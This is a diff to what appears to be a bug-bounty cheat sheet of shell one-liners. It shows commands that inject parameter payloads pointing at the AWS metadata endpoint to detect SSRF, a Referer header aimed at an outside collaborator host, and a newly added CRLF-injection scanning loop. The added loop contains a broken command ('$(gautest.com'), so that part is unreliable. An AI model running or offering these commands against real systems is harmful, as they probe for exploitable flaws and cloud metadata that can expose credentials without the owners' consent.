@@ -75,3 +75,6 @@ subfinder -d testphp.vulnweb.com -silent | httpx -H "Referer: http://burpcollab.
 **SSRF to access metadata**
 Automation;
 gau -subs testphp.vulnweb.com | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I% sh -c 'curl -sk "%" 2>&1 | grep "compute.internal" && echo " ssrf aws metadata %"'
+
+**CRLF**
+for crlf in $(cat crlfpayload.txt); do for url in $(gautest.com | grep "=" | qsreplace "$crlf"); do echo $url| xargs -I@ sh -c 'curl -sk -I "@" 2>&1 | grep -q "Set-Cookie:%20test=test" && echo "CRLF VUL @"' ;done ;done
